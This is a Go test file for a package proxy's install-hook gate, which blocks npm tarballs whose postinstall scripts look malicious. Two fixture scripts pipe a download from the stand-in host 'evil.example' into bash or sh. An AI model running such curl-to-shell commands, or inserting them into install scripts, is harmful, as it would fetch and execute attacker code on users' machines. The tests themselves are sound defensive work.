package proxy

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/blechschmidt/pullthrough-security/internal/backends"
	"github.com/blechschmidt/pullthrough-security/internal/backends/httpbackend"
	"github.com/blechschmidt/pullthrough-security/internal/cache"
	"github.com/blechschmidt/pullthrough-security/internal/installhooks"
	"github.com/blechschmidt/pullthrough-security/internal/upstream"
)

// newInstallHooksGateway builds a gateway whose "npm" backend serves cacheable
// tarballs and whose install-hook gate is seeded with the given service.
func newInstallHooksGateway(t *testing.T, upstreamURL string, svc *installhooks.Service) *Gateway {
	t.Helper()
	registry := backends.NewRegistry()
	b, err := httpbackend.New(httpbackend.Options{
		Name:        "npm",
		BaseURL:     upstreamURL,
		Client:      upstream.NewWithHTTPClient(http.DefaultClient, "test/1"),
		Cacheable:   func(r *backends.Request) bool { return strings.Contains(r.Path, "/-/") },
		Coordinator: tarballCoordinator,
	})
	if err != nil {
		t.Fatalf("httpbackend.New: %v", err)
	}
	if err := registry.Register(b); err != nil {
		t.Fatalf("Register: %v", err)
	}
	g, err := New(Dependencies{
		Logger:       slog.New(slog.NewTextHandler(io.Discard, nil)),
		Cache:        cache.NewMemoryCache(),
		Backends:     registry,
		InstallHooks: svc,
		Ecosystems:   map[string]string{"npm": "npm"},
	}, Options{HTTPAddr: ":0"})
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	return g
}

func npmTarballBytes(scripts map[string]string) []byte {
	manifest, _ := json.Marshal(map[string]any{"name": "demo", "version": "1.0.0", "scripts": scripts})
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	_ = tw.WriteHeader(&tar.Header{Name: "package/package.json", Mode: 0o644, Size: int64(len(manifest)), Typeflag: tar.TypeReg})
	_, _ = tw.Write(manifest)
	_ = tw.Close()
	_ = gz.Close()
	return buf.Bytes()
}

func mustInstallHooks(t *testing.T) *installhooks.Service {
	t.Helper()
	svc, err := installhooks.NewService(installhooks.DefaultConfig())
	if err != nil {
		t.Fatalf("installhooks.NewService: %v", err)
	}
	return svc
}

func TestInstallHooksGateBlocksMaliciousPostinstall(t *testing.T) {
	tarball := npmTarballBytes(map[string]string{"postinstall": "curl -s http://evil.example/x | bash"})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/gzip")
		_, _ = w.Write(tarball)
	}))
	defer srv.Close()

	g := newInstallHooksGateway(t, srv.URL, mustInstallHooks(t))

	rr := httptest.NewRecorder()
	g.routes().ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/v1/npm/demo/-/demo-1.0.0.tgz", nil))

	if rr.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403 (body %q)", rr.Code, rr.Body.String())
	}
	if rr.Header().Get("X-InstallHooks-Decision") != "block" {
		t.Errorf("missing X-InstallHooks-Decision=block header (got %q)", rr.Header().Get("X-InstallHooks-Decision"))
	}
	var body installHooksError
	if err := json.Unmarshal(rr.Body.Bytes(), &body); err != nil {
		t.Fatalf("decode body: %v", err)
	}
	if body.Code != "risky-install-script" || len(body.Findings) == 0 {
		t.Errorf("unexpected block body: %+v", body)
	}

	// The poisoned artifact must have been evicted from the cache, so a re-pull
	// re-fetches and is blocked again rather than served clean from the cache.
	rr2 := httptest.NewRecorder()
	g.routes().ServeHTTP(rr2, httptest.NewRequest(http.MethodGet, "/v1/npm/demo/-/demo-1.0.0.tgz", nil))
	if rr2.Code != http.StatusForbidden {
		t.Errorf("re-pull status = %d, want 403 (artifact must not be served from cache)", rr2.Code)
	}
}

func TestInstallHooksGateAllowsBenign(t *testing.T) {
	tarball := npmTarballBytes(map[string]string{"postinstall": "node ./scripts/setup.js"})
	var hits int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt32(&hits, 1)
		_, _ = w.Write(tarball)
	}))
	defer srv.Close()

	g := newInstallHooksGateway(t, srv.URL, mustInstallHooks(t))

	rr := httptest.NewRecorder()
	g.routes().ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/v1/npm/demo/-/demo-1.0.0.tgz", nil))
	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (body %q)", rr.Code, rr.Body.String())
	}
	if !bytes.Equal(rr.Body.Bytes(), tarball) {
		t.Errorf("served body does not match upstream tarball")
	}
}

func TestInstallHooksGateDisabledIsNoop(t *testing.T) {
	tarball := npmTarballBytes(map[string]string{"postinstall": "curl http://evil.example | sh"})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write(tarball)
	}))
	defer srv.Close()

	// nil service => gate is a no-op; the malicious artifact is served.
	g := newInstallHooksGateway(t, srv.URL, nil)
	rr := httptest.NewRecorder()
	g.routes().ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/v1/npm/demo/-/demo-1.0.0.tgz", nil))
	if rr.Code != http.StatusOK {
		t.Fatalf("disabled gate must serve; status = %d", rr.Code)
	}
}
